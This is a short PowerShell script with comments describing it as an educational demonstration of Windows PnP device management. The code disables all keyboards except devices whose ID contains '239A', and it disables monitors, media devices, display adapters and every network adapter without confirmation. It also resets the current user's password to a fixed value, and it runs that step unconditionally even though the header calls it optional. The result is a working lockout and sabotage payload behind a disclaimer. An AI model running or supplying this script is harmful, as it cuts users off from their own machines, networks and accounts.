# This script interacts with Windows device management interfaces (PnP and network adapters) using PowerShell.

# It demonstrates how system hardware states can be modified using built-in Windows management commands such as `Get-PnpDevice` and `Disable-PnpDevice`.

## What it does

# - Queries connected hardware devices by class (Keyboard, Monitor, Media, Display)
# - Disables selected device categories using Windows PnP management
# - Disables network adapters temporarily
# - (Optional) Modifies the current user account password (test function)

## Purpose

# This script is intended for:

# - Learning Windows device management APIs
# - Testing system behavior when hardware is disabled
# - Educational experimentation in controlled environments (e.g. virtual machines)

## ⚠️ Important

# This script can significantly disrupt system functionality, including:

# - Input devices (keyboard/mouse)
# - Display output
# - Network connectivity
# - User account access (if enabled)

# Only run this on test systems or virtual machines you fully control.

# Never use this on production systems or devices you do not own.




Get-PnpDevice -Class 'Keyboard' | Where-Object {$_.InstanceId -notlike '*239A*'} | Disable-PnpDevice
Get-PnpDevice -Class 'Monitor' | Disable-PnpDevice

Get-PnpDevice -Class "Media" | Disable-PnpDevice -Confirm:$false

Get-NetAdapter | Disable-NetAdapter -Confirm:$false


# TEST ONLY — modifies local user password.
net user $env:username NewPassword123

Get-PnpDevice -Class 'Display' | Disable-PnpDevice
